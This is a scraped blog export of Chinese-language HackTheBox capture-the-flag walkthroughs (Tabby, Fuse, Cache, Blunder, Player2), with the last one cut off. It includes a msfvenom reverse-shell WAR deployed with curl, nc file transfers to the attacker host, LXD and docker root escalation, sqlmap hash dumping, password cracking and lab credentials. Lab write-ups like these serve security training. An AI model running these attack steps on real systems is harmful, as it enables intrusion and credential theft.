YouTubehttps://www.youtube.com/watch?v=oriAA1ccPpc HTB | OOUCH | Walkthrough | na5c4r - YouTubehttps://www.youtube.com/watch?v=cn57ZvaXWPg","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Tabby - HackTheBox","slug":"Tabby-HackTheBox","date":"2020-07-14T06:54:10.000Z","updated":"2020-11-09T00:39:56.779Z","comments":true,"path":"2020/07/14/Tabby-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/07/14/Tabby-HackTheBox/","excerpt":"","text":"基本信息 10.10.10.194 https://www.hackthebox.eu/home/machines/profile/259 端口扫描 80 很容易发现News那里有个file参数，注意要加一下hosts： 110.10.10.194 megahosting.htb LFI这里一个很明显的LFI： 80808080是tomcat管理界面，不存在常规弱密码：s LFI to RCE常规的一些文件都无法读取： /proc/self/environ /proc/self/fd /var/log/apache2/access.log /var/log/apache2/error.log tomcat-users.xml根据前面tomcat界面信息，tomcat-users.xml文件中包含tomcat管理用户密码，但这个tomcat不是官网文档安装路径，实际路径是/usr/share/tomcat9/etc/tomcat-users.xml(参考资料里说的是自己装个tomcat9就能知道这个路径。。。)： 得到tomcat管理账号密码： 1username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;$3cureP4s5w0rd123!&quot; 部署webshell登录上去没有上传接口，不能直接上传war包 根据官方文档，可以使用curl部署： https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html 1curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/miao' 部署成功，我们得到tomcat权限的shell： webshell不太方便，可以msfvenom生成一个： 123msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.33 LPORT=7777 -f war &gt; shell1.warcurl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell1.war 'http://10.10.10.194:8080/manager/text/deploy?path=/miao1'curl http://10.10.10.194:8080/miao1/ 交互shell将反弹的哑shell转滨城交互shell： 1python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 搜集信息直接用前面的密码尝试切换到ash用户失败，搜寻能够在/var/www/html/files看到一个16162020_backup.zip文件,把这个文件下载下来： 123nc -lvvp 7778 &gt; 16162020_backup.zipnc -w 3 10.10.14.33 7778 &lt; 16162020_backup.zip 这个压缩包需要解压密码，直接爆破： 12fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zippossible pw found: admin@it () user flag压缩包密码就是ash用户的密码，不能ssh，直接在前面的shell切换过去，用户目录得到user.txt： 提权信息ash用户在lxd组： 12iduid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) 搜索能够发现： Lxd Privilege Escalationhttps://www.hackingarticles.in/lxd-privilege-escalation/ 提权1234567891011121314151617# 本地buildgit clone https://github.com/saghul/lxd-alpine-builder.gitcd lxd-alpine-buildersudo bash build-alpine# 靶机操作wget 10.10.14.33:8888/alpine-v3.12-x86_64-20200710_2021.tar.gzlxc image import ./alpine-v3.12-x86_64-20200710_2021.tar.gz --alias miaolxc image list# 这一步如果No storage pool found的话，先# lxd init 一路默认即可lxc init miao miaoaaaa -c security.privileged=truelxc config device add miaoaaaa mydevice disk source=/ path=/mnt/root recursive=truelxc start miaoaaaalxc exec miaoaaaa /bin/shcd /mnt/root/root root flag在lxc容器中，我们进入挂载目录即外部root根目录，读取root.txt： 参考资料 https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html Lxd Privilege Escalationhttps://www.hackingarticles.in/lxd-privilege-escalation/ LIQUID RAGEhttps://liquidrage.netlify.app/tabby/ Tabby HackTheBox Walkthrough | Ethicalhacs.comhttps://ethicalhacs.com/tabby-hackthebox-walkthrough/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Fuse - HackTheBox","slug":"Fuse-HackTheBox","date":"2020-07-13T07:39:50.000Z","updated":"2020-11-02T04:24:27.860Z","comments":true,"path":"2020/07/13/Fuse-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/07/13/Fuse-HackTheBox/","excerpt":"","text":"基本信息 10.10.10.193 https://www.hackthebox.eu/home/machines/profile/256 端口扫描1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 nmap -sC -sV 10.10.10.193Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-13 13:35 CSTNmap scan report for 10.10.10.193Host is up (0.23s latency).Not shown: 988 filtered portsPORT STATE SERVICE VERSION53/tcp open domain?| fingerprint-strings:| DNSVersionBindReqTCP:| version|_ bind80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn't have a title (text/html).88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-07-13 05:53:45Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=7/13%Time=5F0BF2B8%P=x86_64-apple-darwin18.6.0%SF:r(DNSVersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07veSF:rsion\\x04bind\\0\\0\\x10\\0\\x03\");Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h37m58s, deviation: 4h02m31s, median: 17m56s| smb-os-discovery:| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: Fuse| NetBIOS computer name: FUSE\\x00| Domain name: fabricorp.local| Forest name: fabricorp.local| FQDN: Fuse.fabricorp.local|_ System time: 2020-07-12T22:56:10-07:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: required| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2020-07-13T05:56:09|_ start_date: 2020-07-13T04:40:18Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 334.53 seconds 80直接访问无法访问，根据跳转加hosts： 110.10.10.193 fuse.fabricorp.local 根据能够查看的CSV文件整理得到一些用户名： 12345cat users.txt pmertontlavelsthompsonbhult 信息搜集smbsmb可以匿名登录，没什么信息： em4linux 没什么信息 12Domain Name: FABRICORPDomain Sid: S-1-5-21-2633719317-1471316042-3957863514 cewl使用cewl根据网页内容生成密码字典： 1cewl -d 5 -m 3 -w wordlist.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers smb爆破使用已有的用户名和密码字典爆破： 12[+] 10.10.10.193:445 - 10.10.10.193:445 - Success: '.\\tlavel:Fabricorp01'[+] 10.10.10.193:445 - 10.10.10.193:445 - Success: '.\\bhult:Fabricorp01' 但无法直接使用，提示NT_STATUS_PASSWORD_MUST_CHANGE： smbpasswd可以使用旧密码，通过smbpasswd修改密码，之后使用新密码，注意密码需要满足规则： rpc enum使用我们修改的新密码通过rpc获取信息，前面修改密码后需要尽快使用，应该是会自动还原为原密码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566rpcclient -U FABRICORP\\\\tlavel 10.10.10.193Enter FABRICORP\\tlavel's password:rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[svc-print] rid:[0x450]user:[bnielson] rid:[0x451]user:[sthompson] rid:[0x641]user:[tlavel] rid:[0x642]user:[pmerton] rid:[0x643]user:[svc-scan] rid:[0x645]user:[bhult] rid:[0x1bbd]user:[dandrews] rid:[0x1bbe]user:[mberbatov] rid:[0x1db1]user:[astein] rid:[0x1db2]user:[dmuir] rid:[0x1db3]rpcclient $&gt; enumprivsfound 35 privilegesSeCreateTokenPrivilege 0:2 (0x0:0x2)SeAssignPrimaryTokenPrivilege 0:3 (0x0:0x3)SeLockMemoryPrivilege 0:4 (0x0:0x4)SeIncreaseQuotaPrivilege 0:5 (0x0:0x5)SeMachineAccountPrivilege 0:6 (0x0:0x6)SeTcbPrivilege 0:7 (0x0:0x7)SeSecurityPrivilege 0:8 (0x0:0x8)SeTakeOwnershipPrivilege 0:9 (0x0:0x9)SeLoadDriverPrivilege 0:10 (0x0:0xa)SeSystemProfilePrivilege 0:11 (0x0:0xb)SeSystemtimePrivilege 0:12 (0x0:0xc)SeProfileSingleProcessPrivilege 0:13 (0x0:0xd)SeIncreaseBasePriorityPrivilege 0:14 (0x0:0xe)SeCreatePagefilePrivilege 0:15 (0x0:0xf)SeCreatePermanentPrivilege 0:16 (0x0:0x10)SeBackupPrivilege 0:17 (0x0:0x11)SeRestorePrivilege 0:18 (0x0:0x12)SeShutdownPrivilege 0:19 (0x0:0x13)SeDebugPrivilege 0:20 (0x0:0x14)SeAuditPrivilege 0:21 (0x0:0x15)SeSystemEnvironmentPrivilege 0:22 (0x0:0x16)SeChangeNotifyPrivilege 0:23 (0x0:0x17)SeRemoteShutdownPrivilege 0:24 (0x0:0x18)SeUndockPrivilege 0:25 (0x0:0x19)SeSyncAgentPrivilege 0:26 (0x0:0x1a)SeEnableDelegationPrivilege 0:27 (0x0:0x1b)SeManageVolumePrivilege 0:28 (0x0:0x1c)SeImpersonatePrivilege 0:29 (0x0:0x1d)SeCreateGlobalPrivilege 0:30 (0x0:0x1e)SeTrustedCredManAccessPrivilege 0:31 (0x0:0x1f)SeRelabelPrivilege 0:32 (0x0:0x20)SeIncreaseWorkingSetPrivilege 0:33 (0x0:0x21)SeTimeZonePrivilege 0:34 (0x0:0x22)SeCreateSymbolicLinkPrivilege 0:35 (0x0:0x23)SeDelegateSessionUserImpersonatePrivilege 0:36 (0x0:0x24)rpcclient $&gt; enumprinters flags:[0x800000] name:[\\\\10.10.10.193\\HP-MFT01] description:[\\\\10.10.10.193\\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)] comment:[]rpcclient $&gt; 得到了一个密码 user那部分处理生成新的用户名字典： 12345678910111213141516cat user.txt | awk '&#123;print $1&#125;' | sed 's/\\[/ /g' | awk '&#123;print $2&#125;' | sed 's/\\]//g'AdministratorGuestkrbtgtDefaultAccountsvc-printbnielsonsthompsontlavelpmertonsvc-scanbhultdandrewsmberbatovasteindmuir smb爆破(参考资料用的winrm爆破，但我测试就是跑不出来，smb可以） 使用这个密码再次进行smb爆破,用户名字典使用前面rpc得到的新字典： 12[+] 10.10.10.193:445 - 10.10.10.193:445 - Success: '.\\svc-print:$fab@s3Rv1ce$1'[+] 10.10.10.193:445 - 10.10.10.193:445 - Success: '.\\svc-scan:$fab@s3Rv1ce$1' user flagsvc-print通过evil-winrm登录，桌面得到user.txt: 提权信息12345678910111213141516171819202122232425262728293031323334353637383940414243444546whoami /allUSER INFORMATION----------------User Name SID=================== ==============================================fabricorp\\svc-print S-1-5-21-2633719317-1471316042-3957863514-1104GROUP INFORMATION-----------------Group Name Type SID Attributes========================================== ================ ============================================== ==================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Print Operators Alias S-1-5-32-550 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupFABRICORP\\IT_Accounts Group S-1-5-21-2633719317-1471316042-3957863514-1604 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeLoadDriverPrivilege Load and unload device drivers EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled. 可以看到： 1SeLoadDriverPrivilege Load and unload device drivers Enabled 搜索能够得到相关提权方式： Abusing SeLoadDriverPrivilege for privilege escalation - Tarlogic Security - Cyber Security and Ethical hackinghttps://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/ Privileged Accounts and Token Privileges - HackTrickshttps://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege 这里有编译好的利用程序，自己修改netcat.bat内容就可以： https://github.com/mach1el/htb-scripts/tree/master/exploit-fuse 提权 直接把所有文件传上去运行即可： root flag监听端口得到system shell，administrator用户桌面得到root.txt: 参考资料 Abusing SeLoadDriverPrivilege for privilege escalation - Tarlogic Security - Cyber Security and Ethical hackinghttps://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/ Privileged Accounts and Token Privileges - HackTrickshttps://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege https://github.com/mach1el/htb-scripts/tree/master/exploit-fuse [HTB] Fuse walkthrough – Phantom InfoSechttps://phantominfosec.wordpress.com/2020/07/01/htb-fuse-walkthrough/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Cache - HackTheBox","slug":"Cache-HackTheBox","date":"2020-07-07T07:20:42.000Z","updated":"2020-10-12T00:36:45.302Z","comments":true,"path":"2020/07/07/Cache-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/07/07/Cache-HackTheBox/","excerpt":"","text":"基本信息 10.10.10.188 https://app.hackthebox.eu/machines/251 端口扫描常规22和80 80直接访问没什么信息： 登录界面加载了functionality.js，里面硬编码的账号密码 1ash:H@v3_fun 登录进去也没什么东西： functionality.js123456789101112131415161718192021222324252627282930313233343536$(function()&#123; var error_correctPassword = false; var error_username = false; function checkCorrectPassword()&#123; var Password = $(\"#password\").val(); if(Password != 'H@v3_fun')&#123; alert(\"Password didn't Match\"); error_correctPassword = true; &#125; &#125; function checkCorrectUsername()&#123; var Username = $(\"#username\").val(); if(Username != \"ash\")&#123; alert(\"Username didn't Match\"); error_username = true; &#125; &#125; $(\"#loginform\").submit(function(event) &#123; /* Act on the event */ error_correctPassword = false; checkCorrectPassword(); error_username = false; checkCorrectUsername(); if(error_correctPassword == false &amp;&amp; error_username ==false)&#123; return true; &#125; else&#123; return false; &#125; &#125;); &#125;); 子域名扫描根据author界面提示，other project，我们考虑子域名，先根据页面内容生成字典： 1234567891011cewl -w wordlist.txt -d 10 -m 1 http:&#x2F;&#x2F;10.10.10.188&#x2F;author.htmlwfuzz -w wordlist.txt -H &quot;HOST: FUZZ.htb&quot; -u http:&#x2F;&#x2F;10.10.10.188&#x2F; --hc 400 --hh 8193Target: http:&#x2F;&#x2F;10.10.10.188&#x2F;Total requests: 42&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;ID Response Lines Word Chars Payload&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;000000037: 302 0 L 0 W 0 Ch &quot;HMS&quot; 将HMS.htb加到hosts里 110.10.10.188 cache.htb hms.htb has.htb 直接访问是openEMR： 搜索发现一个需要认证的RCE： Google搜索发现一个SQL注入： OpenEMR Simulated Attack - YouTubehttps://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s sql注入这里需要去访问portal，有时候前面做完的人会去把portal关了，reset一下machine就好了 之后就是salmap一把梭： 1234567891011121314sqlmap -r sql.txt[14:33:01] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.29back-end DBMS: MySQL &gt;&#x3D; 5.0sqlmap -r sql.txt --dbsavailable databases [2]:[*] information_schema[*] openemrsqlmap -r sql.txt -D openemr --tablessqlmap -r sql.txt -D openemr -T users_secure --dumpopenemr_admin : $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. john解出来密码是xxxxxx(坑： 12345678910sudo john -w=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 32 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusxxxxxx (?)1g 0:00:00:00 DONE (2020-05-24 05:13) 3.333g/s 2820p/s 2820c/s 2820C/s tristan..princesitaUse the \"--show\" option to display all of the cracked passwords reliablySession completed 然后就可以登录openEMR，利用前面的RCE sql.txt1234567891011GET &#x2F;portal&#x2F;find_appt_popup_user.php?catid&#x3D;1 HTTP&#x2F;1.1Host: hms.htbUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,en-US;q&#x3D;0.7,en;q&#x3D;0.3Accept-Encoding: gzip, deflateConnection: closeCookie: OpenEMR&#x3D;4ebpe344qk9vhcjgk2nesv54gv; PHPSESSID&#x3D;qeiik41c06okaktjdpebot7n05Upgrade-Insecure-Requests: 1DNT: 1Cache-Control: max-age&#x3D;0 openEMR RCE直接用exp打就可以，得到www-root权限的shell： user flag查看用户目录发现两个用户，其中一个是ash，直接用前面得到的ash用户密码切换过去即可,用户目录得到user.txt： 搜集信息查看本地开放端口，发现11211，明显是memcached： 12345678910111213ash@cache:~$ netstat -tulpnnetstat -tulpn(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN -tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN -tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN -tcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN -tcp6 0 0 :::22 :::* LISTEN -tcp6 0 0 :::80 :::* LISTEN -udp 0 0 127.0.0.53:53 0.0.0.0:* memcached exploit 参考资料： Penetration Testing on Memcached Serverhttps://www.hackingarticles.in/penetration-testing-on-memcached-server/ Memcache Exploithttps://niiconsulting.com/checkmate/2013/05/memcache-exploit/ 123456789101112131415telnet 127.0.0.1 11211stats slabsstats itemsstats cachedump 1 0get userget userVALUE user 0 5luffyENDget passwdget passwdVALUE passwd 0 90n3_p1ec3END 我们得到luffy用户的密码，切换过去(这个用户直接SSH登录也行),这个用户属于docker组： 123luffy@cache:~$ ididuid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker) docker 提权 https://gtfobins.github.io/gtfobins/docker/ 就是docker直接挂载根目录，读取root.txt： 参考资料 OpenEMR Simulated Attack - YouTubehttps://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s Penetration Testing on Memcached Serverhttps://www.hackingarticles.in/penetration-testing-on-memcached-server/ Memcache Exploithttps://niiconsulting.com/checkmate/2013/05/memcache-exploit/ https://gtfobins.github.io/gtfobins/docker/ [HTB] Cache writeup – Phantom InfoSechttps://phantominfosec.wordpress.com/2020/05/30/htb-cache-writeup/ HTB::Cache Walkthrough - ca01h’s Bloghttps://ca0y1h.top/Target_drone/HackTheBox/18.HTB-Cache-walkthrough/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Blunder - HackTheBox","slug":"Blunder-HackTheBox","date":"2020-07-01T07:28:45.000Z","updated":"2020-10-19T05:34:55.872Z","comments":true,"path":"2020/07/01/Blunder-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/07/01/Blunder-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/254 10.10.10.191 端口扫描21和80,21closed 80 目录扫描12345678910111213141516171819gobuster dir -u http://10.10.10.191/ -w /usr/share/seclists/Discovery/Web-Content/common.txt.../install.php (Status: 200)/.htaccess (Status: 403)/robots.txt (Status: 200)/.html (Status: 403)/.php (Status: 403)/.htpasswd (Status: 403)/.htm (Status: 403)/.htpasswds (Status: 403)/.gitignore (Status: 200)/.htgroup (Status: 403)/wp-forum.phps (Status: 403)/.htaccess.bak (Status: 403)/.htuser (Status: 403)/.ht (Status: 403)/.htc (Status: 403)/todo.txt (Status: 200)... admin有个admin目录，需要账号密码： install.phpinstall.php可以看出是Bludit： robots.txt .gitignore todo.txt fergus应该是用户名 密码爆破因为没什么其他有用信息，就使用cewl根据网页内容生成密码字典： 1cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191 因为登录会带一个csrf token，不能直接用burp之类的爆破： 根据前面知道的Bludit能够搜到爆破脚本： Bludit CMS Version 3.9.2 Brute Force Protection Bypasshttps://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/tree/master 跑出来结果： 12SUCCESS: Password found!Use fergus:RolandDeschain to login. 成功登录： 文件上传搜索Bludit漏洞得到相关信息： Bludit v3.9.2 Code Execution Vulnerability in “Upload function” · Issue #1081 · bludit/bludithttps://github.com/bludit/bludit/issues/1081 某CMS 审计记录 - Christa’s bloghttps://christa.top/details/46/ 利用上传.htaccess来解析shell 直接加载meterpreter方便后续操作： 搜集信息 在web目录有一个新版本的Bludit，里面配置文件中有密码信息： 1234567891011121314151617181920212223www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.phpcat users.php&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;&#123; \"admin\": &#123; \"nickname\": \"Hugo\", \"firstName\": \"Hugo\", \"lastName\": \"\", \"role\": \"User\", \"password\": \"faca404fd5c0a31cf1897b823c695c85cffeb98d\", \"email\": \"\", \"registered\": \"2019-11-27 07:40:55\", \"tokenRemember\": \"\", \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\", \"tokenAuthTTL\": \"2009-03-15 14:00\", \"twitter\": \"\", \"facebook\": \"\", \"instagram\": \"\", \"codepen\": \"\", \"linkedin\": \"\", \"github\": \"\", \"gitlab\": \"\"&#125;&#125; user flag使用上面解出来的密码切换到hugo用户，得到user.txt: 提权信息直接sudo -l能够看到： 1(ALL, !root) /bin/bash 很容易搜索到利用方式： https://www.exploit-db.com/exploits/47502 root flag 直接提权读取root.txt: 参考资料 https://github.com/digininja/CeWL Bludit CMS Version 3.9.2 Brute Force Protection Bypasshttps://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/tree/master Bludit v3.9.2 Code Execution Vulnerability in “Upload function” · Issue #1081 · bludit/bludithttps://github.com/bludit/bludit/issues/1081 某CMS 审计记录 - Christa’s bloghttps://christa.top/details/46/ https://www.exploit-db.com/exploits/47502 Hack-The-Box-walkthrough[blunder] | lUc1f3r11’s bloghttps://fdlucifer.github.io/2020-06-05-blunder.html HTB::Blunder-walkthrough - ca01h’s Bloghttps://ca0y1h.top/Target_drone/HackTheBox/19.HTB-Blunder-walkthrough/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Player2 - HackTheBox","slug":"Player2-HackTheBox","date":"2020-06-30T08:34:14.000Z","updated":"2020-07-20T02:33:03.137Z","comments":true,"path":"2020/06/30/Player2-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/06/30/Player2-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/221 10.10.10.170 端口扫描这里需要全端口扫描，默认扫描会漏掉开放的8545: 80直接访问是一个错误页面： 配置hosts访问： 110.10.10.170 player2.htb subdomain1wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 -H \"Host: FUZZ.player2.htb\" --hh 102 -u http://10.10.10.170 同样把product.player2.htb加到hosts里，访问： 8545直接访问： 根据信息，知道是twirp，根据文档 https://github.com/twitchtv/twirp/blob/master/docs/routing.md 知道service定义是在.proto文件，稍后的目录扫描中有proto目录 目录扫描1234567891011121314151617181920212223242526gobuster dir -u http://player2.htb/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php/images (Status: 301)/index (Status: 200)/index.php (Status: 200)/assets (Status: 301)/src (Status: 301)/mail (Status: 200)/mail.php (Status: 200)/vendor (Status: 301)/generated (Status: 301)/proto (Status: 301)gobuster dir -u http://product.player2.htb/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php/images (Status: 301)/home (Status: 302)/home.php (Status: 302)/totp (Status: 302)/totp.php (Status: 302)/index (Status: 200)/index.php (Status: 200)/assets (Status: 301)/mail (Status: 200)/mail.php (Status: 200)/api (Status: 301) api直接访问是403: 继续扫描： 1234gobuster dir -u http://product.player2.htb/api/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php/totp (Status: 200)/totp.php (Status: 200) 123curl -X POST http://product.player2.htb/api/totp&#123;\"error\":\"Invalid Session\"&#125; 根据信息搜索发现 https://en.wikipedia.org/wiki/Time-based_One-time_Password_algorithm 这里是Time-based One-time Password，用于根据时间生成一次性密码 proto1gobuster dir -u http:&#x2F;&#x2F;player2.htb&#x2F;api&#x2F;proto -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt -t 50 -x proto 这个proto定义了一个Auth service，package是twirp.player2.auth ，这个service有一个GenCreds() 方法用于返回Creds twirp基于protobuf的RPC框架，根据官方文档： https://twitchtv.github.io/twirp/docs/curl.html 可以结合curl进行测试 123456789mkdir protocd protowget http://player2.htb/proto/generated.protowget https://github.com/protocolbuffers/protobuf/releases/download/v3.12.3/protoc-3.12.3-linux-x86_64.zipunzip protoc-3.12.3-linux-x86_64.zipcurl -s -X POST -H \"Content-Type: application/protobuf\" http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds | ./bin/protoc -I . --decode twirp.player2.auth.Creds generated.protoname: \"0xdf\"pass: \"ze+EKe-SGF^5uZQX\" 但这组用户密码不能正常登录product 生成字典可以生成100组，去重： 1234567891011121314151617181920./client.shFinding Credentials...Unique Credentials:name: \"mprox\" pass: \"Lp-+Q8umLW5*7qkc\"name: \"jkr\" pass: \"ze+EKe-SGF^5uZQX\"name: \"snowscan\" pass: \"tR@dQnwnZEk95*6#\"name: \"jkr\" pass: \"tR@dQnwnZEk95*6#\"name: \"0xdf\" pass: \"XHq7_WJTA?QD_?E2\"name: \"mprox\" pass: \"tR@dQnwnZEk95*6#\"name: \"jkr\" pass: \"Lp-+Q8umLW5*7qkc\"name: \"0xdf\" pass: \"ze+EKe-SGF^5uZQX\"name: \"0xdf\" pass: \"tR@dQnwnZEk95*6#\"name: \"jkr\" pass: \"XHq7_WJTA?QD_?E2\"name: \"snowscan\" pass: \"XHq7_WJTA?QD_?E2\"name: \"snowscan\" pass: 